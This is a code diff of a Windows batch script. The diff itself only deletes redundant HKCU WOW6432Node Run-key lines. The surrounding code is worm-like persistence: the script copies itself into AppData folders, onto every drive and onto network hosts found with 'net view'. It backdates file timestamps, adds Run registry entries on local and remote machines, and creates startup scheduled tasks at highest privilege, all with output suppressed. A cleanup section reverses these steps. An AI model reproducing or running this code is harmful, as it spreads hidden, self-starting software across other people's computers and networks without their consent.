@@ -91,7 +91,6 @@ for %%i in (localAppData appData) do (
     call %module_fileTouch% /w /a /c /d %app_date% "!%%i!\%~nx0"
     call reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /ff
     call reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
-    call reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /
     call reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "!%%i!\%~nx0" /f
     call schtasks /create /sc onstart /tn "%app_name% %%i" /tr "!%%i!\%~nx0" /f /rl highest
   )>nul 2>nul
@@ -110,7 +109,6 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
         %module_fileTouch% /w /a /c /d %app_date% "%%i:\%%j\%~nx0"
         reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
         reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
-        reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
         reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
         schtasks /create /sc onstart /tn "%app_name% %%i" /tr "%%i:\%%j\%~nx0" /f /rl highest
       )>nul 2>nul
@@ -153,7 +151,6 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The"
           %module_fileTouch% /w /a /c /d %app_date% "%%h\%%i\%%j\%~nx0"
           reg add %%h\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
           reg add %%h\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
-          reg add %%h\HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
           reg add %%h\HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
           for /f "delims=\" %%z in ("%%h") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%i" /tr "%%i:\%%j\%~nx0" /f /rl highest
         )>nul 2>nul
@@ -206,7 +203,6 @@ for %%i in (localAppData appData) do (
     call del /q "!%%i!\%~nx0"
     call reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
     call reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-    call reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
     call reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
     call schtasks /delete /tn "%app_name% %%i" /f
   )>nul 2>nul
@@ -223,7 +219,6 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
         del /q "%%i:\%%j\%~nx0"
         reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
         reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-        reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
         reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
         schtasks /delete /tn "%app_name% %%i" /f
       )>nul 2>nul
@@ -248,7 +243,6 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The"
           del /q "%%h\%%i\%%j\%~nx0"
           reg delete %%h\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
           reg delete %%h\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-          reg delete %%h\HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
           reg delete %%h\HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
           for /f "delims=\" %%z in ("%%h") do schtasks /delete /s %%z /tn "%app_name% %%i" /f
         )>nul 2>nul
